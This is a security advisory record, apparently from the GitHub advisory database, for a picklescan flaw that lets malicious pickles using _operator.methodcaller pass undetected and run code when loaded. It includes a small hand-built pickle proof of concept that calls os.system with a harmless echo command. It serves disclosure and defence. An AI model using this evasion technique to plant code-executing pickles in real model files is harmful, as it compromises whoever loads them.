advisory_id: GHSA-955r-x9j8-7rhh
datasource_id: github_osv_importer_v2/GHSA-955r-x9j8-7rhh
datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-955r-x9j8-7rhh/GHSA-955r-x9j8-7rhh.json
aliases: []
summary: "Picklescan is vulnerable to RCE via missing detection when calling built-in python\
  \ _operator.methodcaller\n### Summary\nPicklescan uses  _operator.methodcaller, which is a\
  \ built-in python library function to execute remote pickle files.\n\n### Details\nThe attack\
  \ payload executes in the following steps:\n\n- First, the attacker crafts the payload by\
  \ calling to _operator.methodcaller function in reduce method\n- Then when after the victim\
  \ after checks whether or not the pickle file is safe by using Picklescan library and the\
  \ library doesn't dectect any dangerous functions, pickle.load()  loads this malicious pickle\
  \ file, thus lead to remote code execution.\n\n### PoC\n```\nimport pickle\nimport pickletools\n\
  opcode2 = b'''cbuiltins\n__import__\n(Vos\ntRp0\n0c_operator\nmethodcaller\n(Vsystem\nVecho\
  \ \"pwned by _operator.methodcaller\"\ntR(g0\ntR.'''\npickletools.dis(opcode2)\npickle.loads(opcode2)\n\
  ```\nThis PoC can't be easily create by pickle.dumps, so it was manually built. \n\n### Impact\n\
  Any organization or individual relying on picklescan to detect malicious pickle files inside\
  \ PyTorch models.\nAttackers can embed malicious code in pickle file that remains undetected\
  \ but executes when the pickle file is loaded.\nAttackers can distribute infected pickle files\
  \ across ML models, APIs, or saved Python objects.\n\n### Report by\nPinji Chen (cpj24@mails.tsinghua.edu.cn)\
  \ from NISL lab (https://netsec.ccert.edu.cn/about) at Tsinghua University, Guanheng Liu (coolwind326@gmail.com)."
impacted_packages:
  - purl: pkg:pypi/picklescan
    affected_versions: vers:pypi/<0.0.34
    fixed_versions: vers:pypi/0.0.34
    fixed_in_commits: []
    introduced_in_commits: []
severities:
  - score: '8.9'
    scoring_system: cvssv4
    scoring_elements: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P
    published_at: None
    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-955r-x9j8-7rhh/GHSA-955r-x9j8-7rhh.json
  - score: HIGH
    scoring_system: generic_textual
    scoring_elements:
    published_at: None
    url:
weaknesses:
  - CWE-502
  - CWE-94
references:
  - url: https://github.com/mmaitre314/picklescan
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/commit/f2dea43e0c838e09ace1e62994143254b51de927
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/releases/tag/v0.0.34
    reference_type:
    reference_id:
  - url: https://github.com/mmaitre314/picklescan/security/advisories/GHSA-955r-x9j8-7rhh
    reference_type:
    reference_id:
